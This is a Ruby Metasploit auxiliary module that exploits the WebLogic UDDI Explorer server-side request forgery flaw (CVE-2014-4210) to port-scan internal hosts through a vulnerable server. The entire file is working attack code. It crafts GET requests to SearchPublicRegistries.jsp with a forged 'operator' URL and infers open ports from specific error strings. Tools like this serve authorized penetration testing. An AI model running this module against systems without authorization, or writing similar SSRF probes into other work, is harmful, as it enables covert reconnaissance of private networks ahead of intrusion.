##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient

  def initialize(info={})
    super(update_info(info,
      'Name'        => 'WebLogic SSRF Port Scan',
      'Description' => %q{
        This module is used to scan ports via ssrf of weblogic.
      },
      'Reference'   =>
        [
          ['CVE', '2014-4210'] 
        ],
      'Author'      =>
        [
          'superfish <sfish9hello[at]gmail.com>' # Metasploit Module
        ],
      'License'     => MSF_LICENSE,
      'DisclosureDate' => 'Nov 10 2016'))

    register_options(
      [
        Opt::RHOST(),
        Opt::RPORT(80),
        OptString.new('TARGETURI', [ true, "WebLogic path", '/']),
        OptString.new('SCANIP', [ true, "IP(C) to scan, ip or ip/24", '']),
        OptString.new('SCANPORT', [ true, "Ports to scan, split with space, ALL for all", '21 22 23 80 135 139 443 445 1080 1433 1521 2375 3306 3389 4899 6379 7001 8000 8080 9000 11211']),
        OptString.new('UA', [ true, "User-Agent", 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.108 Safari/537.36'])
      ], self.class)
  end

  def run
    scan_ip = datastore['SCANIP']
    num = /\d|[01]?\d\d|2[0-4]\d|25[0-5]/
    if scan_ip[-3,3] == '/24'
      x = /^(#{num}\.){3}#{num}/
      if !(x =~ scan_ip)
        print_error("TARGETIP error format: #{scan_ip}")
        return
      end
      ip_l = 1...255
    else
      x = /^(#{num}\.){3}#{num}$/
      if !(x =~ scan_ip)
        print_error("TARGETIP error format: #{scan_ip}")
        return
      end
      ip_l = [scan_ip.split('.')[3],]
    end
    ip_prefix = scan_ip.split('.')[0] + '.' + scan_ip.split('.')[1] + '.' + scan_ip.split('.')[2] + '.'     
    if datastore['SCANPORT'] != 'ALL'
      ports = datastore['SCANPORT'].split(' ')
    else
      ports = 1...65535
    end  
    uri = normalize_uri(target_uri.path, 'uddiexplorer', 'SearchPublicRegistries.jsp')
    for i in ip_l
      for port in ports
        target_scan = ip_prefix + i.to_s + ':' + port.to_s.gsub(' ', '')
        begin
          res = send_request_cgi({
                                   'method'   => 'GET',
                                   'uri'      => uri,
                                   'vars_get' =>
                                     {
                                        "operator"      => "http://#{target_scan}",
                                        "rdoSearch"     => "name",
                                        "txtSearchname" => "sdf",
                                        "txtSearchkey"  => "",
                                        "txtSearchfor"  => "",
                                        "selfor"        => "Business+location",
                                        "btnSubmit"     => "Search"
                                     },
                                   'headers'  => 
                                     {
                                        "user-agent" => "#{datastore['UA']}"
                                     }
                                 })
        rescue ::Rex::ConnectionError, Errno::ECONNREFUSED, Errno::ETIMEDOUT
          print_error("HTTP Connection Failed")
          return
        end
        unless res
          print_error("#{target_scan} - Server Response Error")
          next
        end
        if res.code.to_s == '200'
          if res.body.include?'IO Exception on sendMessage'
            print_error("Can't use the SSRF on #{datastore['RHOST']}")
            return
          elsif res.body.include?'weblogic.uddi.client.structures.exception.XML_SoapException' and !(res.body.include?'but could not connect')
            print_good("#{target_scan} open")
          else
            print_good("#{target_scan} close")
          end
        else
          print_error("#{target_scan} - HTTP Error: #{res.code.to_s}")
        end       
      end
    end          
  end
end
